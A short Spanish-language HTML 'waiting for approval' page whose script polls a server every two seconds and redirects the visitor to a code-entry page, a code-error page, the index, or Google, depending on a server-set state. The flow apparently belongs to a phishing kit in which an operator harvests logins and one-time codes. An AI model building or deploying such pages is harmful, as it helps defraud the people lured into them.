<!DOCTYPE html>
<html>
<head>
  <title>Esperando aprobación</title>
</head>
<body>

<h2>⏳ Esperando aprobación...</h2>

<script>
const id=localStorage.getItem("id");

async function check(){
  const r=await fetch("/api/estado/"+id);
  const j=await r.json();

  if(j.estado==="index") location="index.html";
  if(j.estado==="codigo") location="codigo.html";
  if(j.estado==="ok") location="https://google.com/codigo";
  if(j.estado==="coderr") location="codigoerr.html";
}

setInterval(check,2000);
</script>

</body>
</html>
